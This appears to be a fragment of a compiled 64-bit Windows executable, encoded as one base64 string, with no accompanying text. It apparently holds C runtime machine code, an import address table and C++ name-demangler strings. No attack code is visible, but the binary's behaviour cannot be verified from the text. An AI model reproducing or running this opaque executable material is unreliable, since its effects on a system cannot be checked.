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QAAAAAAAG9wZXJhdG9yAAAAAC0+AAAqAAAAKysAAC0tAAAtAAAAKwAAACYAAAAtPioALwAAACUAAAA8AAAAPD0AAD4AAAA+PQAALAAAACgpAAB+AAAAXgAAAHwAAAAmJgAAfHwAACo9AAArPQAALT0AAC89AAAlPQAAPj49ADw8PQAmPQAAfD0AAF49AABgdmZ0YWJsZScAAAAAAAAAYHZidGFibGUnAAAAAAAAAGB2Y2FsbCcAYHR5cGVvZicAAAAAAAAAAGBsb2NhbCBzdGF0aWMgZ3VhcmQnAAAAAGBzdHJpbmcnAAAAAAAAAABgdmJhc2UgZGVzdHJ1Y3RvcicAAAAAAABgdmVjdG9yIGRlbGV0aW5nIGRlc3RydWN0b3InAAAAAGBkZWZhdWx0IGNvbnN0cnVjdG9yIGNsb3N1cmUnAAAAYHNjYWxhciBkZWxldGluZyBkZXN0cnVjdG9yJwAAAABgdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGB2ZWN0b3IgZGVzdHJ1Y3RvciBpdGVyYXRvcicAAAAAYHZlY3RvciB2YmFzZSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAAGB2aXJ0dWFsIGRpc3BsYWNlbWVudCBtYXAnAAAAAAAAYGVoIHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAAAAAAGBlaCB2ZWN0b3IgZGVzdHJ1Y3RvciBpdGVyYXRvcicAYGVoIHZlY3RvciB2YmFzZSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAGBjb3B5IGNvbnN0cnVjdG9yIGNsb3N1cmUnAAAAAAAAYHVkdCByZXR1cm5pbmcnAGBFSABgUlRUSQAAAAAAAABgbG9jYWwgdmZ0YWJsZScAYGxvY2FsIHZmdGFibGUgY29uc3RydWN0b3IgY2xvc3VyZScAIG5ld1tdAAAAAAAAIGRlbGV0ZVtdAAAAAAAAAGBvbW5pIGNhbGxzaWcnAABgcGxhY2VtZW50IGRlbGV0ZSBjbG9zdXJlJwAAAAAAAGBwbGFjZW1lbnQgZGVsZXRlW10gY2xvc3VyZScAAAAAYG1hbmFnZWQgdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGBtYW5hZ2VkIHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgZWggdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYGVoIHZlY3RvciB2YmFzZSBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAA